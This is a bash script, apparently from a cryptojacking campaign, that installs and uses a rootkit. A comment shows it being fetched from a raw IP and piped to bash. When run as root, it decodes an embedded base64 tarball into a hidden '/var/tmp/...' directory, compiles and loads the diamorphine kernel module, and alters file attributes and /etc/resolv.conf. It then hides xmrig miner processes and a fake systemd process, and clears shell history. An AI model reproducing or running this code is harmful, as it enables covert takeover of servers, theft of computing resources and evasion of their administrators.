#!/bin/bash

# wget -O - http://45.9.148.35/chimaera/sh/setup_hide.sh | bash

DIA_TAR='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'
CHECK_WHOAMI=`whoami`

function old_school_hide(){
echo "bash hide"
}


function setup_dia(){
chattr -ia / /etc/ /tmp/ /var/ /var/tmp/ 2>/dev/null
chattr -R -ia /tmp/ /var/tmp/ 2>/dev/null
chmod 1777 /tmp/ /var/tmp/ 2>/dev/null

cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.8.8' 2>/dev/null || chattr -ia /etc/resolv.conf 2>/dev/null ; echo 'nameserver 8.8.8.8' >> /etc/resolv.conf ; chattr +i /etc/resolv.conf 2>/dev/null
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.4.4' 2>/dev/null || chattr -ia /etc/resolv.conf 2>/dev/null ; echo 'nameserver 8.8.4.4' >> /etc/resolv.conf ; chattr +i /etc/resolv.conf 2>/dev/null

if type yum 2>/dev/null 1>/dev/null; then yum clean all ; yum -y install gcc make kmod ; yum -y install "kernel-devel-uname-r == $(uname -r)" ; fi
if type apt 2>/dev/null 1>/dev/null; then apt update --fix-missing ; apt-get -y install gcc make kmod ; apt-get -y install linux-headers-$(uname -r)  ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add linux-headers 2>/dev/null ; fi

if [ ! -d "/var/tmp/.../dia/" ]; then mkdir -p /var/tmp/.../dia/ ; fi
echo $DIA_TAR | base64 -d > /var/tmp/.../dia/dia.tar.gz
tar xvf /var/tmp/.../dia/dia.tar.gz -C /var/tmp/.../dia/
rm -f /var/tmp/.../dia/dia.tar.gz
cd /var/tmp/.../dia/
make
if [ -f "/var/tmp/.../dia/diamorphine.ko" ]; then 
insmod diamorphine.ko
    ROOTMO=`ps aux | grep -v grep | grep '/root/moneroocean/xmrig' | awk '{print $2}')`
    if [ ! -z "$ROOTMO" ]; then kill -31 $ROOTMO ; fi
        TMPMO=`ps aux | grep -v grep | grep '/var/tmp/moneroocean/xmrig' | awk '{print $2}')`
        if [ ! -z "$TMPMO" ]; then kill -31 $TMPMO ; fi
            SYSBIN=`ps aux | grep -v grep | grep '/usr/sbin/systemd' | awk '{print $2}')`
            if [ ! -z "$SYSBIN" ]; then kill -31 $SYSBIN ; fi
                JPNB=`ps aux | grep -v grep | grep 'jupyter-notebook' | awk '{print $2}')`
                if [ ! -z "$JPNB" ]; then kill -31 $JPNB ; fi

else echo 'build dia fail!'
old_school_hide
    ROOTMO=`ps aux | grep -v grep | grep '/root/moneroocean/xmrig' | awk '{print $2}')`
    if [ ! -z "$ROOTMO" ]; then hid $ROOTMO ; fi
        TMPMO=`ps aux | grep -v grep | grep '/var/tmp/moneroocean/xmrig' | awk '{print $2}')`
        if [ ! -z "$TMPMO" ]; then hid $TMPMO ; fi
            SYSBIN=`ps aux | grep -v grep | grep '/usr/sbin/systemd' | awk '{print $2}')`
            if [ ! -z "$SYSBIN" ]; then hid $SYSBIN ; fi
                JPNB=`ps aux | grep -v grep | grep 'jupyter-notebook' | awk '{print $2}')`
                if [ ! -z "$JPNB" ]; then hid $JPNB ; fi
fi



}
if [ "$CHECK_WHOAMI" = "root" ]; then setup_dia ; fi
history -c
clear
